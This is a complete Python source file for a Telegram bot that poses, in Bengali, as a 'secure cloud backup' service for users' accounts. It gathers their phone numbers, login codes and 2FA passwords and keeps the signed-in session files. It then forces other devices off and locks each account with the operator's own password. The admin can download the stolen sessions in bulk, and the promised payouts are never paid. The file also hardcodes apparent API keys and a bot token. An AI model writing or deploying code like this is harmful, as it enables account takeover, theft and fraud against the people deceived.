import os
import asyncio
import zipfile
import json
from threading import Thread
from flask import Flask
import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tl_types
from telethon.errors import SessionPasswordNeededError

# ==================== কোর এডমিন কনফিগারেশন ====================
API_ID = 36547444
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"
ADMIN_ID = 8095751648
# =========================================================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
app = Flask(__name__)

BASE_STORAGE_DIR = "user_backups"
DB_FILE = "user_database.json"
SETTINGS_FILE = "bot_settings.json"

if not os.path.exists(BASE_STORAGE_DIR):
    os.makedirs(BASE_STORAGE_DIR)

user_data = {}
admin_state = {}  # এডমিনের ইনপুট ট্র্যাক করার জন্য

# ডিফল্ট ডাইনামিক সেটিংস (যা পরে /panel দিয়ে পরিবর্তন হবে)
DEFAULT_SETTINGS = {
    "security_password": "MySecureBotPassword123",
    "backup_delay": 60,
    "country_prices": {
        "880": 0.15,
        "91": 0.10,
        "57": 0.20
    },
    "country_capacity": {
        "880": 10,
        "91": 100,
        "57": 100
    }
}

def load_settings():
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r") as f:
                loaded = json.load(f)
                # মিসিং কিগুলো ডিফল্ট থেকে রিকভার করার সেফটি মেকানিজম
                for key in DEFAULT_SETTINGS:
                    if key not in loaded:
                        loaded[key] = DEFAULT_SETTINGS[key]
                return loaded
        except:
            return DEFAULT_SETTINGS
    return DEFAULT_SETTINGS

def save_settings(settings):
    with open(SETTINGS_FILE, "w") as f:
        json.dump(settings, f, indent=4)

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(db):
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)

def get_user_balance(user_id):
    db = load_db()
    return db.get(str(user_id), {}).get("balance", 0.0)

def add_user_balance(user_id, amount):
    db = load_db()
    uid_str = str(user_id)
    if uid_str not in db: db[uid_str] = {"balance": 0.0}
    db[uid_str]["balance"] = round(db[uid_str]["balance"] + amount, 2)
    save_db(db)

def get_current_file_count(country_code):
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir): return 0
    return len([f for f in os.listdir(target_dir) if f.endswith(".session")])

@app.route('/')
def home(): return "Bot Admin Panel Server Active!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

Thread(target=run_web, daemon=True).start()

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def get_country_code(phone_number):
    clean = phone_number.replace("+", "").replace(" ", "")
    if clean.startswith("880"): return "880"
    if clean.startswith("91"): return "91"
    if clean.startswith("57"): return "57"
    if clean.startswith("1"): return "1"
    if clean.startswith("44"): return "44"
    if clean.startswith("7"): return "7"
    return clean[:3]

def get_user_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_profile = types.KeyboardButton("👤 My Profile")
    btn_withdraw = types.KeyboardButton("💳 Withdraw")
    btn_capacity = types.KeyboardButton("📊 Capacity")
    btn_cancel = types.KeyboardButton("❌ Cancel")
    markup.add(btn_profile, btn_withdraw, btn_capacity, btn_cancel)
    return markup

# ==================== এডমিন কন্ট্রোল প্যানেল UI ====================
def get_admin_panel_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_pass = types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="pnl_pass")
    btn_time = types.InlineKeyboardButton("⏳ Change Delay Time", callback_data="pnl_time")
    btn_price = types.InlineKeyboardButton("💰 Custom Country Price", callback_data="pnl_price")
    btn_cap = types.InlineKeyboardButton("📊 Set Country Capacity", callback_data="pnl_cap")
    btn_new_country = types.InlineKeyboardButton("🌍 Add New Country", callback_data="pnl_new")
    btn_close = types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close")
    markup.add(btn_pass, btn_time)
    markup.add(btn_price, btn_cap)
    markup.add(btn_new_country)
    markup.add(btn_close)
    return markup

@bot.message_handler(commands=['panel'])
def admin_panel_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    settings = load_settings()
    
    panel_msg = (
        "🛠️ **Welcome to Master Admin Control Panel**\n\n"
        f"🔐 **2FA Password:** `{settings['security_password']}`\n"
        f"⏳ **Security Delay Time:** `{settings['backup_delay']} Seconds`\n\n"
        "📈 **Active Countries, Prices & Capacities:**\n"
    )
    for code in settings["country_prices"]:
        prc = settings["country_prices"][code]
        cap = settings["country_capacity"].get(code, "No Limit")
        panel_msg += f"• 🌍 `+{code}` ➜ Price: **${prc}** | Cap: **{cap}**\n"
        
    bot.send_message(message.chat.id, panel_msg, reply_markup=get_admin_panel_keyboard())

# ==================================================================

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        bot.reply_to(
            message,
            "👋 *স্বাগতম এডমিন ভাই!*\n\n"
            "🛠️ লাইভ সেটিংস ও কন্ট্রোল প্যানেল ওপেন করতে টাইপ করুন: `/panel`\n"
            "📊 স্টোরেজ চেক করতে: `/status [কান্ট্রি_কোড]`\n"
            "📦 ফাইল ডাউনলোড করতে: `/get [কান্ট্রি_কোড] [সংখ্যা]`"
        )
    else:
        bot.send_message(
            message.chat.id,
            "👋 *স্বাগতম!*\n\n"
            "আপনার টেলিগ্রাম আইডির একটি নিরাপদ ক্লাউড ব্যাকআপ তৈরি করতে "
            "আপনার ফোন নম্বরটি আন্তর্জাতিক ফরম্যাটে পাঠান (যেমন: `+88017XXXXXXXX`)।",
            reply_markup=get_user_keyboard()
        )

async def send_otp_task(phone_number, user_id, message):
    settings = load_settings()
    country_code = get_country_code(phone_number)
    
    max_capacity = settings["country_capacity"].get(country_code, 9999)
    current_count = get_current_file_count(country_code)
    
    if current_count >= max_capacity:
        bot.reply_to(message, f"❌ **Capacity Over!**\n\nদুঃখিত, এই মুহূর্তে দেশ কোড `+{country_code}` এর জন্য আমাদের সার্ভার স্টোরেজ সম্পূর্ণ ফুল।")
        return

    clean_phone = phone_number.replace("+", "").replace(" ", "")
    country_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(country_dir): os.makedirs(country_dir)
        
    final_session_path = os.path.join(country_dir, f"+{clean_phone}")
    user_client = TelegramClient(final_session_path, API_ID, API_HASH)
    await user_client.connect()
    
    try:
        sent_code = await user_client.send_code_request(phone_number)
        user_data[user_id] = {
            "client": user_client, "phone": phone_number,
            "phone_code_hash": sent_code.phone_code_hash,
            "clean_phone": clean_phone, "session_path": final_session_path,
            "country_code": country_code, "country_dir": country_dir
        }
        bot.reply_to(message, "📨 আপনার টেলিগ্রাম অ্যাপে যাওয়া ওটিপি কোডটি (OTP) এখানে পাঠান।")
    except Exception as e:
        bot.reply_to(message, f"❌ ওটিপি পাঠানো যায়নি: {str(e)}")
        await user_client.disconnect()
        if os.path.exists(f"{final_session_path}.session"): os.remove(f"{final_session_path}.session")

async def process_security_and_backup(user_id, message, data, current_client):
    settings = load_settings()
    delay = settings["backup_delay"]
    sec_password = settings["security_password"]
    
    status_msg = bot.reply_to(
        message, 
        f"⏳ **ওটিপি ভেরিফাইড!**\n\n"
        f"আপনার অ্যাকাউন্টটি সফলভাবে রোবোটে ব্যাকআপ নেওয়া হচ্ছে। "
        f"নিরাপত্তা যাচাইকরণের জন্য অনুগ্রহ করে **{delay} সেকেন্ড** অপেক্ষা করুন...\n\n"
        f"⚠️ *ইউজার নোটিশ:* এই সময়ের মধ্যে আপনার অ্যাকাউন্টে অন্য কোনো থার্ড-party ডিভাইস লগইন থাকলে তা "
        f"আপনার ফোন থেকে অবিলম্বে লগআউট বা ডিলিট করে দিন। অন্যথায় ব্যাকআপ বাতিল হবে।"
    )

    await asyncio.sleep(delay)
    
    try:
        authorizations = await current_client(functions.account.GetAuthorizationsRequest())
        other_devices = []
        
        for auth in authorizations.authorizations:
            if not auth.current:
                other_devices.append(f"📱 {auth.device_model} ({auth.app_name}) - {auth.country}")
        
        if len(other_devices) > 0:
            devices_list = "\n".join(other_devices)
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text=f"❌ **ব্যাকআপ ব্যর্থ! অন্য ডিভাইস সনাক্ত হয়েছে!**\n\n"
                     f"আপনার অ্যাকাউন্টটি নিচের ডিভাইসগুলোতে লগইন আছে:\n\n{devices_list}\n\n"
                     f"🛡️ সিকিউরিটির স্বার্থে আগে অন্য ডিভাইসগুলো আপনার টেলিগ্রাম অ্যাপের "
                     f"(Settings > Devices) থেকে লগআউট করুন, তারপর আবার চেষ্টা করুন।"
            )
            await current_client.disconnect()
            if os.path.exists(f"{data['session_path']}.session"): os.remove(f"{data['session_path']}.session")
            return False

        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="⚙️ অ্যাকাউন্ট সিকিউরিটি লক (Two-Step Verification) সচল করা হচ্ছে...")
        
        try:
            await current_client(functions.account.UpdatePasswordSettingsRequest(
                password=tl_types.InputCheckPasswordEmpty(),
                new_settings=tl_types.PasswordInputSettings(
                    new_password=sec_password,
                    hint="Bot Security Lock"
                )
            ))
        except Exception:
            pass 

        await current_client.disconnect()
        
        price = settings["country_prices"].get(data['country_code'], 0.05)
        add_user_balance(user_id, price)
        current_bal = get_user_balance(user_id)
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            text=f"✅ **অ্যাকাউন্ট সফলভাবে ব্যাকআপ ও লক করা হয়েছে!**\n\n"
                 f"💰 আপনার দেশ কোড `+{data['country_code']}` অনুযায়ী অ্যাকাউন্টে **${price}** যোগ করা হয়েছে।\n"
                 f"💳 বর্তমান মোট ব্যালেন্স: **${current_bal}**"
        )
        
        bot.send_message(
            ADMIN_ID, 
            f"🔔 **নতুন নিরাপদ ব্যাকআপ সম্পন্ন!**\n\n"
            f"🌍 দেশ কোড: `{data['country_code']}`\n"
            f"📱 নম্বর: `+{data['clean_phone']}`\n"
            f"🔐 লক পাসওয়ার্ড: `{sec_password}`\n"
            f"💾 স্টোরেজে সেশন ফাইল সেভ করা হয়েছে।"
        )
        return True

    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=f"❌ ব্যাকআপ প্রসেসিং এরর: {str(e)}")
        await current_client.disconnect()
        if os.path.exists(f"{data['session_path']}.session"): os.remove(f"{data['session_path']}.session")
        return False

async def verify_otp_task(text, user_id, message):
    data = user_data[user_id]
    user_client = data["client"]
    
    if data.get("waiting_for_password"):
        try:
            await user_client.sign_in(password=text)
            await process_security_and_backup(user_id, message, data, user_client)
            del user_data[user_id]
        except Exception as e:
            bot.reply_to(message, f"❌ ভুল পাসওয়ার্ড বা সমস্যা: {str(e)}\nআবার চেষ্টা করুন:")
    else:
        try:
            await user_client.sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
            await process_security_and_backup(user_id, message, data, user_client)
            del user_data[user_id]
        except SessionPasswordNeededError:
            bot.reply_to(message, "🔐 Two-Step Verification অন আছে। দয়া করে পাসওয়ার্ডটি দিন:")
            user_data[user_id]["waiting_for_password"] = True
        except Exception as e:
            bot.reply_to(message, f"❌ লগইন ব্যর্থ: {str(e)}")
            await user_client.disconnect()
            if os.path.exists(f"{data['session_path']}.session"): os.remove(f"{data['session_path']}.session")
            del user_data[user_id]

# ==================== এডমিন প্যানেল কলব্যাক হ্যান্ডলার ====================
@bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
def handle_admin_callbacks(call):
    if call.from_user.id != ADMIN_ID: return
    
    if call.data == "pnl_close":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return

    bot.delete_message(call.message.chat.id, call.message.message_id)
    
    if call.data == "pnl_pass":
        msg = bot.send_message(call.message.chat.id, "🔐 **নতুন 2FA সিকিউরিটি পাসওয়ার্ডটি লিখুন:**")
        admin_state[call.from_user.id] = "wait_pass"
    elif call.data == "pnl_time":
        msg = bot.send_message(call.message.chat.id, "⏳ **ব্যাকআপের জন্য কত সেকেন্ড ওয়েটিং টাইম (Delay) রাখতে চান? শুধু সংখ্যাটি লিখুন (যেমন: 45):**")
        admin_state[call.from_user.id] = "wait_time"
    elif call.data == "pnl_price":
        msg = bot.send_message(call.message.chat.id, "💰 **কোন দেশের প্রাইজ কত করতে চান তা এভাবে লিখুন:** `কান্ট্রি_কোড=প্রাইজ`\n\nউদাহরণ: `880=0.25` (অর্থাৎ বাংলাদেশের প্রাইজ $0.25 হবে)")
        admin_state[call.from_user.id] = "wait_price"
    elif call.data == "pnl_cap":
        msg = bot.send_message(call.message.chat.id, "📊 **কোন দেশের সর্বোচ্চ ফাইল ক্যাপাসিটি কত করতে চান তা এভাবে লিখুন:** `কান্ট্রি_কোড=লিমিট`\n\nউদাহরণ: `880=50` (অর্থাৎ বাংলাদেশে সর্বোচ্চ ৫০টি সেশন জমা হবে)")
        admin_state[call.from_user.id] = "wait_cap"
    elif call.data == "pnl_new":
        msg = bot.send_message(call.message.chat.id, "🌍 **নতুন দেশ অ্যাড করতে দেশ কোড, ডিফল্ট প্রাইজ এবং লিমিট এভাবে লিখুন:** `কোড=প্রাইজ=লিমিট`\n\nউদাহরণ: `1=0.30=200` (ইউএসএ কোড ১, প্রাইজ $0.30, লিমিট ২০০)")
        admin_state[call.from_user.id] = "wait_new"

# =======================================================================

@bot.message_handler(commands=['status'])
def status_command(message):
    if message.from_user.id != ADMIN_ID: return
    settings = load_settings()
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ ফরম্যাট: `/status [কান্ট্রি_কোড]`")
        return
    country_code = args[1].replace("+", "").strip()
    max_cap = settings["country_capacity"].get(country_code, "No Limit")
    current_count = get_current_file_count(country_code)
    bot.reply_to(message, f"📊 **দেশ কোড `+{country_code}` স্ট্যাটাস:**\n\n📁 মোট সেশন জমা: **{current_count}টি**\n⚙️ সর্বোচ্চ ক্যাপাসিটি লিমিট: **{max_cap}টি**")

@bot.message_handler(commands=['get'])
def get_files(message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "❌ সঠিক ফরম্যাট: `/get [কান্ট্রি_কোড] [ফাইলের_সংখ্যা]`")
        return
    country_code = args[1].replace("+", "").strip()
    try: count = int(args[2])
    except ValueError:
        bot.reply_to(message, "❌ ফাইলের সংখ্যাটি অবশ্যই একটি সংখ্যা হতে হবে।")
        return

    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir):
        bot.reply_to(message, f"❌ দেশ কোড `{country_code}`-এর কোনো ফাইল স্টোরেজে নেই।")
        return
        
    all_sessions = sorted([f for f in os.listdir(target_dir) if f.endswith(".session")])
    if not all_sessions:
        bot.reply_to(message, f"❌ দেশ কোড `{country_code}` ফোল্ডারে কোনো সেশন ফাইল নেই।")
        return
    
    files_to_take = all_sessions[:count]
    actual_count = len(files_to_take)
    bot.reply_to(message, f"📦 দেশ কোড `{country_code}` থেকে {actual_count}টি ফাইল প্রসেস করা হচ্ছে...")
    
    master_zip_name = f"Country_{country_code}_Fetch_{actual_count}_files.zip"
    try:
        with zipfile.ZipFile(master_zip_name, 'w') as master_zip:
            for file_name in files_to_take:
                file_path = os.path.join(target_dir, file_name)
                master_zip.write(file_path, arcname=file_name)
                os.remove(file_path)
        with open(master_zip_name, 'rb') as doc:
            bot.send_document(message.chat.id, doc, caption=f"✅ দেশ কোড `+{country_code}`-এর সফলভাবে {actual_count}টি ফাইল পাঠানো হলো।")
    except Exception as e:
        bot.reply_to(message, f"❌ সমস্যা হয়েছে: {str(e)}")
    finally:
        if os.path.exists(master_zip_name): os.remove(master_zip_name)

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()
    username = message.from_user.username if message.from_user.username else "নেই"

    # এডমিন প্যানেলের ইনপুট প্রোসেসিং ও সেভ করার লজিক
    if user_id == ADMIN_ID and user_id in admin_state:
        state = admin_state[user_id]
        settings = load_settings()
        del admin_state[user_id]
        
        try:
            if state == "wait_pass":
                settings["security_password"] = text
                save_settings(settings)
                bot.reply_to(message, f"✅ **2FA সিকিউরিটি পাসওয়ার্ড পরিবর্তন সফল!**\nনতুন পাসওয়ার্ড: `{text}`\nনতুন করে সেটিং দেখতে আবার `/panel` দিন।")
            
            elif state == "wait_time":
                settings["backup_delay"] = int(text)
                save_settings(settings)
                bot.reply_to(message, f"✅ **ওয়েটিং টাইম আপডেট সফল!**\nএখন থেকে বট ওটিপির পর `{text} সেকেন্ড` অপেক্ষা করবে।")
                
            elif state == "wait_price":
                code, prc = text.split("=")
                settings["country_prices"][code.strip()] = float(prc.strip())
                save_settings(settings)
                bot.reply_to(message, f"✅ **দেশভিত্তিক মূল্য আপডেট সফল!**\nকোড `+{code.strip()}` এর নতুন রেট **${prc.strip()}** সেট করা হয়েছে।")
                
            elif state == "wait_cap":
                code, cap = text.split("=")
                settings["country_capacity"][code.strip()] = int(cap.strip())
                save_settings(settings)
                bot.reply_to(message, f"✅ **সর্বোচ্চ লিমিট সেট সফল!**\nকোড `+{code.strip()}` এ সর্বোচ্চ **{cap.strip()}টি** সেশন জমা হতে পারবে।")
                
            elif state == "wait_new":
                code, prc, cap = text.split("=")
                settings["country_prices"][code.strip()] = float(prc.strip())
                settings["country_capacity"][code.strip()] = int(cap.strip())
                save_settings(settings)
                bot.reply_to(message, f"✅ **নতুন দেশ সফলভাবে যুক্ত হয়েছে!**\n🌍 কোড: `+{code.strip()}`\n💰 প্রাইজ: **${prc.strip()}**\n📊 ক্যাপাসিটি: **{cap.strip()}**")
        except Exception as e:
            bot.reply_to(message, f"❌ ইনপুট ফরমেট ভুল হয়েছে! কোনো পরিবর্তন করা হয়নি। এরর: {str(e)}")
        return

    if text == "👤 My Profile":
        balance = get_user_balance(user_id)
        profile_text = (
            f"👤 **আপনার প্রোফাইল**\n\n"
            f"🆔 ইউজার আইডি: `{user_id}`\n"
            f"🌐 টেলিগ্রাম আইডি (Username): @{username}\n"
            f"💰 মোট ব্যালেন্স: **${balance}**"
        )
        bot.reply_to(message, profile_text)
        return
        
    elif text == "💳 Withdraw":
        bot.reply_to(message, "💳 *উইথড্র রিকোয়েস্ট*\n\n❌ দুঃখিত, বর্তমানে আপনার ব্যালেন্স পর্যাপ্ত নয় অথবা উইথড্র সিস্টেমটি বন্ধ আছে।")
        return
        
    elif text == "📊 Capacity":
        settings = load_settings()
        bd_count = get_current_file_count("880")
        in_count = get_current_file_count("91")
        co_count = get_current_file_count("57")
        
        capacity_text = "📊 **সার্ভার ক্যাপাসিটি স্ট্যাটাস**\n\n"
        for code in settings["country_prices"]:
            count = get_current_file_count(code)
            cap = settings["country_capacity"].get(code, 9999)
            prc = settings["country_prices"][code]
            capacity_text += f"• 🌍 কোড `+{code}` ➜ স্টোরেজ: `{count}/{cap}`টি | (প্রাইজ: `${prc}`)\n"
            
        capacity_text += "\n⚠️ কোনো দেশের ফাইল ফুল হয়ে গেলে সেখানে সাময়িকভাবে ব্যাকআপ বন্ধ দেখাবে।"
        bot.reply_to(message, capacity_text)
        return
        
    elif text == "❌ Cancel":
        if user_id in user_data: del user_data[user_id]
        bot.reply_to(message, "❌ বর্তমান প্রসেসটি বাতিল করা হয়েছে। নতুন করে শুরু করতে /start দিন।", reply_markup=get_user_keyboard())
        return

    if user_id == ADMIN_ID and not text.startswith("+") and user_id not in user_data: return

    if text.startswith("+"):
        bot.reply_to(message, "⏳ টেলিগ্রাম সার্ভারে ওটিপি পাঠানো হচ্ছে...")
        loop.run_until_complete(send_otp_task(text, user_id, message))

    elif user_id in user_data and "phone_code_hash" in user_data[user_id]:
        loop.run_until_complete(verify_otp_task(text, user_id, message))

if __name__ == "__main__":
    print("--- Dynamic Control Panel Mode Online ---")
    bot.infinity_polling(skip_pending=True)
